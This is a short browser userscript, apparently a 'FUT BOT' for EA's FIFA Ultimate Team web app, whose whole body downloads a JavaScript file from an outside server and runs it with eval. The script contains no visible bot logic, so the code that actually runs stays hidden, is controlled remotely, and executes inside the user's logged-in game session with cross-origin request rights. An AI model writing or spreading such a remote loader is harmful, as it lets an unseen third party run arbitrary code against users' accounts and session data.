// ==UserScript==
// @name         FUT BOT
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  try to take over the world!
// @author       You
// @match        https://www.easports.com/de/fifa/ultimate-team/web-app/
// @grant        GM_xmlhttpRequest
// @run-at document-idle

// @downloadURL https://update.greasyfork.org/scripts/372655/FUT%20BOT.user.js
// @updateURL https://update.greasyfork.org/scripts/372655/FUT%20BOT.meta.js
// ==/UserScript==


(function (){
   GM_xmlhttpRequest ( {
   method:     "GET",
   url:        "https://test.da-services.ch/buyer.js",
   onload:     function (response) {
       eval(response.responseText);
   }
   });
})()